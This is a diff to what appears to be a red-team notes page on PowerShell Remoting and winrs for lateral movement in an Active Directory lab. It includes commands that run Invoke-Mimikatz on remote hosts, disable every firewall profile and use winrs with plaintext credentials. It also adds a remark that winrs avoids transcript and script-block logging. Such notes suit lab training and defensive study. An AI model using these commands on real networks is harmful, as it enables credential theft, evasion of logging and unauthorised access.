@@ -19,6 +19,10 @@ Find machines with PS Session
 PSRemoting uses Windows Remote Management (WinRM) which is Microsoft's implementation of WS-Management.
 {% endhint %}
 
+[#powershell-remoting](../misc/theory/concepts.md#powershell-remoting "mention")
+
+* **This Powershell Remoting supports the system-wide transcripts and deep script block logging**
+
 Enable PowerShell Remoting on local system (Requires elevated privileges)
 
 ```powershell
@@ -34,13 +38,12 @@ $sess = New-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local
 #### Enter existing session
 
 ```powershell
-Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
+Enter-PSSession -ComputerName <computer-name>
+Ex: Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
 
 # Using session object
 Enter-PSSession -Session $sess
 ```
-
-
 
 ## Invoke-Command
 
@@ -55,8 +58,8 @@ Invoke-Command -Session $Session -FilePath -ScriptBlock ${Function:Test-Function
 # Load script
 Invoke-Command -FilePath 'C:\Tools\Invoke-Mimikatz.ps1' -Session $Session
 <strong>Invoke-Command -Computername Srv01.Security.local -FilePath 'C:\Tools\Invoke-Mimikatz.ps1'
-</strong><strong>
-</strong><strong># Multiple connections
+</strong>
+<strong># Multiple connections
 </strong><strong>Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content &#x3C;list_of_servers>) 
 </strong></code></pre>
 
@@ -90,8 +93,9 @@ Set-NetFirewallProfile -Profile "Domain","Public","Private" -Enabled "False"}`
 
 ## Winrs
 
+* **Winrs also uses WinRM. But winrs doesn't support the system-wide transcripts and deep script block logging.**
+
 ```powershell
 winrs -r:dcorp-mgmt 'whoami & hostname'
 winrs -r:server1 -u:server1\administrator -p:Pass@1234 'hostname' # With creds
 ```
-
